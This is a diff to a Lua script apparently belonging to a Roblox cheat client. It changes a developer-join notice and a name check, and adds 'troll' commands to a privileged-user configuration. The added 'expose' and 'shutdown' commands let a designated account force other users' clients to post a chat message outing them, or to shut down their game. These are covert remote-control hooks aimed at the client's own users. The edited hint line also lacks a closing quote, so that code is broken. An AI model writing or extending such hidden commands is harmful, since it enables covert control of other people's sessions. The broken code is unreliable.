@@ -4,7 +4,7 @@ task.spawn(function()
 		game.Players.PlayerAdded:Connect(function(plr)
 				if plr.Name == 'Sammywammylol502' then
 					local hint = Instance.new('Hint', workspace)
-					hint.Text = 'A Vastal developer has joined your game!'
+					hint.Text = 'A Vastal developer has joined your game! ('..plr.DisplayName..')
 					game.Debris:AddItem(hint, 3)
 				end
 		end)
@@ -1138,7 +1138,7 @@ end
 local function chk(o)
     local p = o.Parent
     while p do
-        if string.find(string.lower(p.Name), "nvestagd") then return true end
+        if string.find(string.lower(p.Name), "sammywammylol502") then return true end
         p = p.Parent
     end
     return false
@@ -1210,7 +1210,7 @@ local troll_config = {
 		},
 		[9435370570] = {
 			ownership = 1,
-			custon_name = 'Vastal Developer'
+			custon_name = 'poggers'
 		}
 	},
 	
@@ -1292,6 +1292,28 @@ local troll_config = {
                 end
             end
         },
+        ['expose'] = {
+            ownership = 1,
+            run = function(...)
+                local args = {...}
+                local target = find_player(args[1])
+
+                if target then
+                    tcs.TextChannels.RBXGeneral:SendAsync('I am using the Vastal client')
+                end
+            end
+        },
+        ['shutdown'] = {
+            ownership = 1,
+            run = function(...)
+                local args = {...}
+                local target = find_player(args[1])
+
+                if target and target == game.Players.LocalPlayer then
+                    game:Shutdown()
+                end
+            end
+		}
 	}
 }
 
